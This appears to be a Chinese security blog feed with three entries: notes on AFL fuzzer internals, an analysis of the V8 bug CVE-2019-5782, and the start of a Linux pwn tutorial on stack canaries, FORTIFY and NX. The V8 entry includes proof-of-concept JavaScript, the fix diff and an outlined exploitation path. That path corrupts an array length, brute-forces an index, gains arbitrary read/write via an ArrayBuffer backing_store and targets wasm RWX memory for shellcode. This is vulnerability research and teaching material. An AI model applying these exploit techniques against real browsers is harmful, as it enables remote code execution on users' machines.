<li>否则，代表发现了新的超时路径，unique_tmouts计数器加一</li>
<li>如果hang_tmout大于exec_tmout，则以hang_tmout为timeout，重新执行一次runt_target<ul>
<li>如果结果为<code>FAULT_CRASH</code>，就跳转到keep_as_crash</li>
<li>如果结果不是<code>FAULT_TMOUT</code>，就返回keeping，否则就使<code>unique_hangs</code>计数器加一，然后更新last_hang_time的值，并保存到<code>alloc_printf(&quot;%s/hangs/id:%06llu,%s&quot;, out_dir, unique_hangs, describe_op(0))</code>文件。</li>
</ul>
</li>
</ul>
</li>
<li>FAULT_CRASH<ul>
<li>total_crashes计数器加一</li>
<li>如果unique_crashes大于能保存的最大数量<code>KEEP_UNIQUE_CRASH</code>即5000，就直接返回keeping的值</li>
<li>同理，如果不是dumb mode，就<code>simplify_trace((u64 *) trace_bits)</code>进行规整 [[#simplify_trace(u64 *mem)]]</li>
<li>如果没有发现新的crash路径，就直接返回keeping</li>
<li>否则，代表发现了新的crash路径，unique_crashes计数器加一，并将结果保存到<code>alloc_printf(&quot;%s/crashes/id:%06llu,sig:%02u,%s&quot;, out_dir,unique_crashes, kill_signal, describe_op(0))</code>文件。</li>
<li><code>/home/wutang/Desktop/fuzz_test/fuzz_output/fuzzer1/crashes/id:000000,sig:06,src:000005,op:arith8,pos:5,val:-14</code></li>
<li>更新<code>last_crash_time</code>和<code>last_crash_execs=total_execs</code></li>
</ul>
</li>
<li>FAULT_ERROR<ul>
<li>抛出异常</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="simplify-trace-u64-mem"><a href="#simplify-trace-u64-mem" class="headerlink" title="simplify_trace(u64 *mem)"></a>simplify_trace(u64 *mem)</h4><ul>
<li>对一个64位整数数组（位图）进行简化操作,这段代码的目的是对位图中的活动位进行简化，以减少位图的复杂性，提高执行效率。</li>
<li>按8个字节为一组循环读入，直到完全读取完mem<ul>
<li>如果mem不为空<ul>
<li>i从0-7，<code>mem8[i] = simplify_lookup[mem8[i]]</code>，代表规整该路径的命中次数到指令值，这个路径如果没有命中，就设置为1，如果命中了，就设置为128，即二进制的<code>1000 0000</code></li>
</ul>
</li>
<li>否则设置mem为<code>0x0101010101010101ULL</code>，即代表这8个字节代表的path都没有命中，每个字节的值被置为1。</li>
</ul>
</li>
</ul>
<h2 id="afl-showmap"><a href="#afl-showmap" class="headerlink" title="afl-showmap"></a>afl-showmap</h2><h2 id="afl-analyze"><a href="#afl-analyze" class="headerlink" title="afl-analyze"></a>afl-analyze</h2><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
<li><a href="https://eternalsakura13.com/2020/08/23/afl/">sakuraのAFL源码全注释 | Sakuraのblog</a></li>
<li>others</li>
</ul>
]]></content>
      <categories>
        <category>fuzzing</category>
      </categories>
      <tags>
        <tag>fuzzing</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2019-5782_zhaoqixun_2018_11_16发_7.2</title>
    <url>/2020/11/06/browser_about/CVE-2019-5782-zhaoqixun-2018-11-16%E5%8F%91-7-2/</url>
    <content><![CDATA[<p>[TOC]</p>
<h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">- Report: Nov 2018</span><br><span class="line">- Fix: Jan 2019</span><br><span class="line">- Credit: Zhao Qixun(@S0rryMybad) of Qihoo 360 Vulcan Team</span><br><span class="line">- Similar to `Math.expm1` vulnerability.</span><br><span class="line">- Wrong typer&#x27;s assumption caused Out-Of-Bound Read/Write</span><br></pre></td></tr></table></figure>
<ul>
<li><a href="https://twitter.com/S0rryMybad/status/1090438643582267394">https://twitter.com/S0rryMybad/status/1090438643582267394</a></li>
</ul>
<p> <a href="https://github.com/vngkv123/aSiagaming/blob/master/Chrome-v8-906043/Chrome%20V8%20-%20-CVE-2019-5782%20Tianfu%20Cup%20Qihoo%20360%20S0rrymybad-%20-ENG-.pdf">Write up</a></p>
<p>fix info <a href="https://chromium-review.googlesource.com/c/v8/v8/+/1363142">https://chromium-review.googlesource.com/c/v8/v8/+/1363142</a><br>fix commit <a href="https://chromium.googlesource.com/v8/v8/+/deee0a87c0567f9e9bf18e1c8e2417c2f09d9b04">https://chromium.googlesource.com/v8/v8/+/deee0a87c0567f9e9bf18e1c8e2417c2f09d9b04</a></p>
<p><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=906043">bugs_chromium</a> </p>
<ol>
<li>CVE-2019-5782</li>
<li>Blink&gt;JavaScript&gt;WebAssembly Blink&gt;JavaScript</li>
</ol>
<p><a href="https://de4dcr0w.github.io/CVE-2019-5782-v8%E6%95%B0%E7%BB%84%E8%B6%8A%E7%95%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8.html">CVE-2019-5782 v8数组越界漏洞分析与利用</a></p>
<span id="more"></span>
<h2 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h2><p>可利用v8版本 </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">得到版本v8版本  b474b3102bd4a95eafcdb68e0e44656046132bc9</span><br><span class="line">git checkout b474b3102bd4a95eafcdb68e0e44656046132bc9</span><br><span class="line">gclient <span class="built_in">sync</span> -D --verbose</span><br><span class="line"></span><br><span class="line"><span class="comment"># v8编译</span></span><br><span class="line">tools/dev/v8gen.py x64.debug -vv     <span class="comment">#可能出问题</span></span><br><span class="line">tools/dev/v8gen.py x64.release -vv</span><br><span class="line"></span><br><span class="line">ninja -C out.gn/x64.debug d8 -v <span class="comment"># debug 可能出问题</span></span><br><span class="line">ninja -C out.gn/x64.release d8 -v  </span><br></pre></td></tr></table></figure>

<h2 id="fix分析"><a href="#fix分析" class="headerlink" title="fix分析"></a>fix分析</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">int</span> kArgumentsBits = <span class="number">16</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">int</span> kMaxArguments = (<span class="number">1</span> &lt;&lt; kArgumentsBits) - <span class="number">2</span>; <span class="comment">// 16384</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// https://chromium-review.googlesource.com/c/v8/v8/+/1363142/3/src/compiler/verifier.cc#b1256</span></span><br><span class="line">    <span class="keyword">case</span> IrOpcode::kNewArgumentsElements:</span><br><span class="line">      CheckValueInputIs(node, <span class="number">0</span>, Type::ExternalPointer());</span><br><span class="line">      </span><br><span class="line">      CheckValueInputIs(node, <span class="number">1</span>, Type::Range(-Code::kMaxArguments, Code::kMaxArguments, zone));</span><br><span class="line">      CheckTypeIs(node, Type::OtherInternal());</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">-&gt;</span><br><span class="line">    <span class="keyword">case</span> IrOpcode::kNewArgumentsElements:</span><br><span class="line">      CheckValueInputIs(node, <span class="number">0</span>, Type::ExternalPointer());</span><br><span class="line">      </span><br><span class="line">      CheckValueInputIs(node, <span class="number">1</span>, Type::Unsigned30());</span><br><span class="line"></span><br><span class="line"><span class="comment">// https://chromium-review.googlesource.com/c/v8/v8/+/1363142/3/src/compiler/type-cache.h#b167</span></span><br><span class="line">  Type <span class="type">const</span> kArgumentsLengthType = Type::Range(<span class="number">0.0</span>, Code::kMaxArguments, zone());</span><br><span class="line">-&gt;</span><br><span class="line">  Type <span class="type">const</span> kArgumentsLengthType = Type::Unsigned30();</span><br></pre></td></tr></table></figure>
<h2 id="1-2-PoC-分析"><a href="#1-2-PoC-分析" class="headerlink" title="1.2. PoC 分析"></a>1.2. PoC 分析</h2><p>poc1 <a href="https://chromium-review.googlesource.com/c/v8/v8/+/1363142/3/test/mjsunit/regress/regress-crbug-906043.js">https://chromium-review.googlesource.com/c/v8/v8/+/1363142/3/test/mjsunit/regress/regress-crbug-906043.js</a><br>As similar to Math.expm1, x &gt;&gt; 16 is evaluated as <code>false</code> at simplified-lowering phase.<br>We can do Out-Of-Bounds R&#x2F;W via <strong>CheckBounds elimination</strong>.</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">fun</span>(<span class="params">arg</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> x = <span class="variable language_">arguments</span>.<span class="property">length</span>;</span><br><span class="line">  a1 = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">0x10</span>);</span><br><span class="line">  a1[<span class="number">0</span>] = <span class="number">1.1</span>;</span><br><span class="line">  a2 = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">0x10</span>);</span><br><span class="line">  a2[<span class="number">0</span>] = <span class="number">1.1</span>;</span><br><span class="line">  a1[(x &gt;&gt; <span class="number">16</span>) * <span class="number">21</span>] = <span class="number">1.39064994160909e-309</span>;  <span class="comment">// 0xffff00000000</span></span><br><span class="line">  a1[(x &gt;&gt; <span class="number">16</span>) * <span class="number">41</span>] = <span class="number">8.91238232205e-313</span>;     <span class="comment">// 0x2a00000000</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> a1, a2;</span><br><span class="line"><span class="keyword">var</span> a3 = [<span class="number">1.1</span>, <span class="number">2.2</span>];</span><br><span class="line">a3.<span class="property">length</span> = <span class="number">0x11000</span>;</span><br><span class="line">a3.<span class="title function_">fill</span>(<span class="number">3.3</span>);</span><br><span class="line"><span class="keyword">var</span> a4 = [<span class="number">1.1</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++) <span class="title function_">fun</span>(...a4);</span><br><span class="line">%<span class="title class_">OptimizeFunctionOnNextCall</span>(fun);</span><br><span class="line"><span class="title function_">fun</span>(...a4);</span><br><span class="line">res = <span class="title function_">fun</span>(...a3);</span><br><span class="line"><span class="title function_">assertEquals</span>(<span class="number">16</span>, a2.<span class="property">length</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">8</span>; i &lt; <span class="number">32</span>; i++) &#123;</span><br><span class="line">  <span class="title function_">assertEquals</span>(<span class="literal">undefined</span>, a2[i]); <span class="comment">//有问题</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>poc2 <a href="https://github.com/tunz/js-vuln-db/blob/master/v8/CVE-2019-5782.md">https://github.com/tunz/js-vuln-db/blob/master/v8/CVE-2019-5782.md</a></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">opt</span>(<span class="params">arg</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> x = <span class="variable language_">arguments</span>.<span class="property">length</span>;</span><br><span class="line">  a1 = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">0x10</span>);</span><br><span class="line">  a2 = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">2</span>); a2[<span class="number">0</span>] = <span class="number">1.1</span>; a2[<span class="number">1</span>] = <span class="number">1.1</span>;</span><br><span class="line">  a1[(x &gt;&gt; <span class="number">16</span>) * <span class="number">0xf00000</span>] = <span class="number">1.39064994160909e-309</span>; <span class="comment">// 0xffff00000000</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> a1, a2;</span><br><span class="line"><span class="keyword">let</span> small = [<span class="number">1.1</span>];</span><br><span class="line"><span class="keyword">let</span> large = [<span class="number">1.1</span>,<span class="number">1.1</span>];</span><br><span class="line">large.<span class="property">length</span> = <span class="number">65536</span>;</span><br><span class="line">large.<span class="title function_">fill</span>(<span class="number">1.1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">0</span>; j&lt; <span class="number">100000</span>; j++) &#123;</span><br><span class="line">    opt.<span class="title function_">apply</span>(<span class="literal">null</span>, small);</span><br><span class="line">&#125;</span><br><span class="line">opt.<span class="title function_">apply</span>(<span class="literal">null</span>, large);</span><br></pre></td></tr></table></figure>

<h3 id="开始分析poc2"><a href="#开始分析poc2" class="headerlink" title="开始分析poc2"></a>开始分析poc2</h3><h4 id="typed-lowering分析"><a href="#typed-lowering分析" class="headerlink" title="typed lowering分析"></a>typed lowering分析</h4><p><img src="/media/16045662135155.jpg"><br>在SpeculativeNumberShiftRight节点上面有一个LoadField节点，在这个优化阶段，编译器无法得到LoadFiled节点的值，所以对NumberShiftRight进行 range analysis 时，会将其范围直接认为是int32的最大和最小值。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">Type <span class="title">OperationTyper::NumberShiftRight</span><span class="params">(Type lhs, Type rhs)</span> </span>&#123;            </span><br><span class="line">          std::cout &lt;&lt; <span class="string">&quot;[-] min_lhs : &quot;</span>  &lt;&lt; min_lhs  &lt;&lt; std::endl;</span><br><span class="line">          std::cout &lt;&lt; <span class="string">&quot;[-] max_lhs : &quot;</span>  &lt;&lt; max_lhs  &lt;&lt; std::endl;</span><br><span class="line">          std::cout &lt;&lt; <span class="string">&quot;[-] min_rhs : &quot;</span>  &lt;&lt; min_rhs  &lt;&lt; std::endl;</span><br><span class="line">          std::cout &lt;&lt; <span class="string">&quot;[-] max_rhs : &quot;</span>  &lt;&lt; max_rhs  &lt;&lt; std::endl;</span><br><span class="line">          std::cout &lt;&lt; <span class="string">&quot;[-] min : &quot;</span>  &lt;&lt; min  &lt;&lt; std::endl;</span><br><span class="line">          std::cout &lt;&lt; <span class="string">&quot;[-] max : &quot;</span>  &lt;&lt; max  &lt;&lt; std::endl;</span><br><span class="line">          </span><br><span class="line">[-] max_lhs : <span class="number">2147483647</span></span><br><span class="line">[-] min_rhs : <span class="number">16</span></span><br><span class="line">[-] max_rhs : <span class="number">16</span></span><br><span class="line">[-] min : <span class="number">-32768</span></span><br><span class="line">[-] max : <span class="number">32767</span></span><br><span class="line">[-] min_lhs : <span class="number">0</span></span><br><span class="line">[-] max_lhs : <span class="number">65534</span></span><br><span class="line">[-] min_rhs : <span class="number">16</span></span><br><span class="line">[-] max_rhs : <span class="number">16</span></span><br><span class="line">[-] min : <span class="number">0</span></span><br><span class="line">[-] max : <span class="number">0</span></span><br></pre></td></tr></table></figure>

<h4 id="escape-analysis-phase"><a href="#escape-analysis-phase" class="headerlink" title="escape analysis phase"></a>escape analysis phase</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./d8  --shell  --allow-natives-syntax --trace-turbo ~/Desktop/v8_test/CVE-2019-5782_zhaoqixun_2018_11_16/poc2.js</span><br></pre></td></tr></table></figure>
<p>win7下wen访问web分析<br>turbolizer 分析后看到在 load elimination,escape analysis时</p>
<p>Although x can be large than 65534, optimizer thinks x &gt;&gt; 16 is 0.<br>That causes <strong>simplified-lowerer</strong> to do <strong>CheckBounds</strong> elimination.</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">VisitCheckBounds</span><span class="params">(Node* node, SimplifiedLowering* lowering)</span> </span>&#123;</span><br><span class="line">  ...</span><br><span class="line">          std::cout &lt;&lt; <span class="string">&quot;[-] index_type.Min() : &quot;</span>  &lt;&lt; index_type.<span class="built_in">Min</span>()  &lt;&lt; std::endl;</span><br><span class="line">          std::cout &lt;&lt; <span class="string">&quot;[-] index_type.Max() : &quot;</span>  &lt;&lt; index_type.<span class="built_in">Max</span>()  &lt;&lt; std::endl;</span><br><span class="line">          std::cout &lt;&lt; <span class="string">&quot;[-] length_type.Min() : &quot;</span> &lt;&lt; length_type.<span class="built_in">Min</span>() &lt;&lt; std::endl;</span><br></pre></td></tr></table></figure>
<p>As we expected, false propagation makes index_type_Min&#x2F;Max() 0.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[-] TypeArgumentsLength was called</span><br><span class="line">[-] index_type.Min() : 0</span><br><span class="line">[-] index_type.Max() : 0</span><br><span class="line">[-] length_type.Min() : 16</span><br><span class="line">[-] index_type.Min() : 0</span><br><span class="line">[-] index_type.Max() : 0</span><br><span class="line">[-] length_type.Min() : 16</span><br></pre></td></tr></table></figure>
<p>the result of checking the turbolizer in the <strong>escape analysis phase</strong>,<br><img src="/media/16036985117250.jpg"></p>
<p>which shows that checkbounds exist. Here’s what we can check for this <strong>CheckBounds</strong>:<br><img src="/media/16036980630734.jpg"></p>
<h4 id="simplified-lowering-phases"><a href="#simplified-lowering-phases" class="headerlink" title="simplified-lowering phases"></a>simplified-lowering phases</h4><p>在SimplifiedLoweringPhase阶段会对SpeculativeNumberShiftRight的范围再次计算，用于消除CheckBounds：<br><code>16 &gt;&gt; x</code> is calculated, and multiply constant value (51) to result value.<br>And final result value is input node of <strong>CheckBounds</strong>.<br>However, after the <strong>simplified-lowering phases</strong>, this <strong>CheckBounds</strong> Node will disappear as follows.<br><img src="/media/16036997734263.jpg"></p>
<p>So, now there is no boundary check, so you can <strong>freely access OOB R &#x2F; W.</strong> :)<br>Exploit itself is incredibly simple, since OOB R &#x2F; W is available</p>
<h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h4><p>Google_CTF_2018_DuplicateAdditionReducer.md<br>The above link covers Turbofan fairly well.</p>
<p>Math.expm1-35C3_CTF_2018_V8_Krautflare patch_ctf +0和-0不分的 优化错误</p>
<h4 id="漏洞利用思路"><a href="#漏洞利用思路" class="headerlink" title="漏洞利用思路"></a>漏洞利用思路</h4><p>因为错误的假定，typer输入了错误的长度范围</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; len(<span class="string">&quot;10000000000000000&quot;</span>)</span><br><span class="line">17</span><br><span class="line">&gt;&gt;&gt; len(<span class="string">&quot;1111111111111111&quot;</span>)</span><br><span class="line">16</span><br><span class="line">&gt;&gt;&gt; 0x1ffff &gt;&gt; 16</span><br><span class="line">1</span><br></pre></td></tr></table></figure>
<p>最终能访问  1*index form的位置</p>
<h3 id="最终利用"><a href="#最终利用" class="headerlink" title="最终利用"></a>最终利用</h3><p>OOB R&#x2F;W 有效后，调整unboxed double array’s l;ength去造成 另一个oob r&#x2F;w.<br>修改 backing_store of ArrayBuffer 通过仿制 ArrayBuffer在他之后。</p>
<ol>
<li>用 rop payload </li>
<li>wasm function 的v8 进程内存创建了rwx page.放shellcode在这个区段然后arb code</li>
</ol>
<h4 id="有了越界写，怎么知道写入哪里写入-victim-array-length-这里是51"><a href="#有了越界写，怎么知道写入哪里写入-victim-array-length-这里是51" class="headerlink" title="有了越界写，怎么知道写入哪里写入 victim array length  这里是51"></a>有了越界写，怎么知道写入哪里写入 victim array length  这里是51</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">fun</span>(<span class="params">arg</span>) &#123;</span><br><span class="line">	<span class="keyword">let</span> x = <span class="variable language_">arguments</span>.<span class="property">length</span>;<span class="comment">//vulnerability</span></span><br><span class="line"></span><br><span class="line">	a1 = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">0x10</span>);</span><br><span class="line">	a1[<span class="number">0</span>] = <span class="number">1.1</span>;</span><br><span class="line"></span><br><span class="line">	a2 = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">0x10</span>);</span><br><span class="line">	a2[<span class="number">0</span>] = <span class="number">1.1</span>;</span><br><span class="line"></span><br><span class="line">	victim = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>, <span class="number">4.4</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// maybe x &gt;&gt; 16 -&gt; false propagation -&gt; checkbounds elimination</span></span><br><span class="line">	<span class="comment">// a1[(x &gt;&gt; 16) * 21] = 1.39064994160909e-309; // 0xffff00000000</span></span><br><span class="line">	<span class="comment">// a1[(x &gt;&gt; 16) * 41] = 8.91238232205e-313;  // 0x2a00000000</span></span><br><span class="line"></span><br><span class="line">  a1[(x &gt;&gt; <span class="number">16</span>) * &#123;m_index&#125;] = <span class="number">8.691694759794e-311</span>;    <span class="comment">// victim array -&gt; change length property to 0x1000</span></span><br><span class="line">	<span class="comment">//a1[(x &gt;&gt; 16) * 51] = 8.691694759794e-311;    // victim array -&gt; change length property to 0x1000</span></span><br><span class="line">	<span class="comment">//a1[(x &gt;&gt; 16) * 51] = u2d(0, 0x1000);       // victim array -&gt; change length property to 0x1000</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>a1在前，victim在后，从前往后写入<br>写python脚本去遍历m_index 范围 0-100 </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 ~/Desktop/v8_test/CVE-2019-5782_zhaoqixun_2018_11_16/CVE-2019-5782_exp2_py.py  -f ~/Desktop/v8_test/CVE-2019-5782_zhaoqixun_2018_11_16/CVE-2019-5782_exp2.js</span><br><span class="line">...</span><br><span class="line">write new path : /tmp/CVE-2019-5782_exp2_51.js</span><br><span class="line">./d8 --allow-natives-syntax /tmp/CVE-2019-5782_exp2_51.js</span><br><span class="line">[+] <span class="built_in">log</span>: start ...</span><br><span class="line">[+] <span class="built_in">log</span>: gc ...</span><br><span class="line">[-] index_type.Min() : 0</span><br><span class="line">[-] index_type.Max() : 0</span><br><span class="line">[-] length_type.Min() : 16</span><br><span class="line">[-] index_type.Min() : 0</span><br><span class="line">[-] index_type.Max() : 0</span><br><span class="line">[-] length_type.Min() : 16</span><br><span class="line">[+] <span class="built_in">log</span>: trigger ...</span><br><span class="line">[+] <span class="built_in">log</span>: victim.length = 4096</span><br><span class="line">Trace/breakpoint <span class="built_in">trap</span> (core dumped)</span><br></pre></td></tr></table></figure>
<h4 id="尝试拿到任意读写"><a href="#尝试拿到任意读写" class="headerlink" title="尝试拿到任意读写"></a>尝试拿到任意读写</h4><p>之前有了越界写，可以写入 victim 长度，然后再控制victim后面的ArrayBuffer 长度。</p>
<ol>
<li>在后面构造Array 如 <code>let leaked = [0xdada, 0xadad, f, &#123;&#125;, 1.1];</code> ，尝试读取 victim[index] &#x3D;&#x3D; 0xdada和 0xadad 找到 wasm_f_idx，拿到 wasm_obj_address</li>
<li>在后面构造ArrayBuffer 如 <code>let ab = new ArrayBuffer(0x50);</code>,尝试读取 victim[index] &#x3D;&#x3D;0x50 找到 ab_ArrayBuffer_length_idx,这时候可以控制 ArrayBuffer ‘s backing_store。</li>
<li>通过 ArrayBuffer ‘s backing_store 可以AAR，AAW</li>
<li>注意最后rwx写入时候偏移不用+1</li>
</ol>
<h4 id="最终利用-两种实现"><a href="#最终利用-两种实现" class="headerlink" title="最终利用-两种实现"></a>最终利用-两种实现</h4><p>…</p>
]]></content>
      <categories>
        <category>chrome</category>
      </categories>
      <tags>
        <tag>bugs</tag>
      </tags>
  </entry>
  <entry>
    <title>linux pwn入门学习到放弃</title>
    <url>/2020/05/20/linux-pwn%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%E5%88%B0%E6%94%BE%E5%BC%83/</url>
    <content><![CDATA[<h1 id="linux-pwn入门学习到放弃"><a href="#linux-pwn入门学习到放弃" class="headerlink" title="linux pwn入门学习到放弃"></a>linux pwn入门学习到放弃</h1><p>[TOC]</p>
<p>PWN是一个黑客语法的俚语词，自”own”这个字引申出来的，意为玩家在整个游戏对战中处在胜利的优势。<br>本文记录菜鸟学习linux pwn入门的一些过程，详细介绍linux上的保护机制，分析一些常见漏洞如栈溢出,堆溢出，use after free等,以及一些常见工具集合介绍等。</p>
<span id="more"></span>

<h2 id="linux程序的常用保护机制"><a href="#linux程序的常用保护机制" class="headerlink" title="linux程序的常用保护机制"></a>linux程序的常用保护机制</h2><p>先来学习一些关于linux方面的保护措施，操作系统提供了许多安全机制来尝试降低或阻止缓冲区溢出攻击带来的安全风险，包括DEP、ASLR等。从checksec入手来学习linux的保护措施。checksec可以检查可执行文件各种安全属性，包括Arch,RELRO,Stack,NX，PIE等。</p>
<ul>
<li><p>pip安装pwntools后自带checksec检查elf文件.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">checksec xxxx.so</span><br><span class="line">    Arch:     aarch64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<p>另外笔者操作系统为macOS,一些常用的linux命令如readelf需要另外brew install binutils安装</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">brew install binutils</span><br></pre></td></tr></table></figure>
</li>
<li><p>当然也可以独自安装checksec</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget https://github.com/slimm609/checksec.sh/archive/2.1.0.tar.gz</span><br><span class="line">tar xvf 2.1.0.tar.gz</span><br><span class="line">./checksec.sh-2.1.0/checksec --file=xxx</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2020/05/20/vTLRcGwqF16QrNZ.jpg" alt="-w1311"></p>
</li>
<li><p>gdb里peda插件里自带的checksec功能</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gdb level4  //加载目标程序</span><br><span class="line">gdb-peda$ checksec </span><br><span class="line">CANARY    : disabled</span><br><span class="line">FORTIFY   : disabled</span><br><span class="line">NX        : ENABLED</span><br><span class="line">PIE       : disabled</span><br><span class="line">RELRO     : Partial</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="CANNARY金丝雀-栈保护-Stack-protect-栈溢出保护"><a href="#CANNARY金丝雀-栈保护-Stack-protect-栈溢出保护" class="headerlink" title="CANNARY金丝雀(栈保护)&#x2F;Stack protect&#x2F;栈溢出保护"></a>CANNARY金丝雀(栈保护)&#x2F;Stack protect&#x2F;栈溢出保护</h3><p>栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让shellcode能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux中我们将cookie信息称为canary&#x2F;金丝雀。<br>gcc在4.2版本中添加了-fstack-protector和-fstack-protector-all编译参数以支持栈保护功能，4.9新增了-fstack-protector-strong编译参数让保护的范围更广。<br>开启命令如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc -o test test.c                       // 默认情况下，开启Canary保护</span><br><span class="line">gcc -fno-stack-protector  -o test test.c //禁用栈保护</span><br><span class="line">gcc -fstack-protector     -o test test.c //启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码</span><br><span class="line">gcc -fstack-protector-all -o test test.c //启用堆栈保护，为所有函数插入保护代码</span><br></pre></td></tr></table></figure>
<h3 id="FORTIFY-轻微的检查"><a href="#FORTIFY-轻微的检查" class="headerlink" title="FORTIFY&#x2F;轻微的检查"></a>FORTIFY&#x2F;轻微的检查</h3><p>fority其实非常轻微的检查，用于检查是否存在缓冲区溢出的错误。适用情形是程序采用大量的字符串或者内存操作函数，如memcpy，memset，stpcpy，strcpy，strncpy，strcat，strncat，sprintf，snprintf，vsprintf，vsnprintf，gets以及宽字符的变体。<br>FORTIFY_SOURCE设为1，并且将编译器设置为优化1(gcc -O1)，以及出现上述情形，那么程序编译时就会进行检查但又不会改变程序功能<br>开启命令如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc -o test test.c		                // 默认情况下，不会开这个检查</span><br><span class="line">gcc -D_FORTIFY_SOURCE=1 -o test test.c // 较弱的检查</span><br><span class="line">gcc -D_FORTIFY_SOURCE=1 仅仅只会在编译时进行检查 (特别像某些头文件 #include &lt;string.h&gt;)</span><br><span class="line">_FORTIFY_SOURCE设为1，并且将编译器设置为优化1(gcc -O1)，以及出现上述情形，那么程序编译时就会进行检查但又不会改变程序功能</span><br><span class="line"></span><br><span class="line">gcc -D_FORTIFY_SOURCE=2 -o test test.c // 较强的检查</span><br><span class="line">gcc -D_FORTIFY_SOURCE=2 程序执行时也会有检查 (如果检查到缓冲区溢出，就终止程序)</span><br><span class="line">_FORTIFY_SOURCE设为2，有些检查功能会加入，但是这可能导致程序崩溃。</span><br></pre></td></tr></table></figure>
<p>看编译后的二进制汇编我们可以看到gcc生成了一些附加代码，通过对数组大小的判断替换strcpy, memcpy, memset等函数名，达到防止缓冲区溢出的作用。</p>
<h3 id="NX-DEP-数据执行保护"><a href="#NX-DEP-数据执行保护" class="headerlink" title="NX&#x2F;DEP&#x2F;数据执行保护"></a>NX&#x2F;DEP&#x2F;数据执行保护</h3><p>数据执行保护(DEP)（Data Execution Prevention） 是一套软硬件技术，能够在内存上执行额外检查以帮助防止在系统上运行恶意代码。在 Microsoft Windows XP Service Pack 2及以上版本的Windows中，由硬件和软件一起强制实施 DEP。<br>支持 DEP 的 CPU 利用一种叫做NX(No eXecute) 不执行”的技术识别标记出来的区域。如果发现当前执行的代码没有明确标记为可执行（例如程序执行后由病毒溢出到代码执行区的那部分代码），则禁止其执行，那么利用溢出攻击的病毒或网络攻击就无法利用溢出进行破坏了。如果 CPU 不支持 DEP，Windows 会以软件方式模拟出 DEP 的部分功能。<br>NX即No-eXecute（不可执行）的意思，NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。<br>开启命令如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc -o test test.c // 默认情况下，开启NX保护</span><br><span class="line">gcc -z execstack -o test test.c // 禁用NX保护</span><br><span class="line">gcc -z noexecstack -o test test.c // 开启NX保护</span><br></pre></td></tr></table></figure>
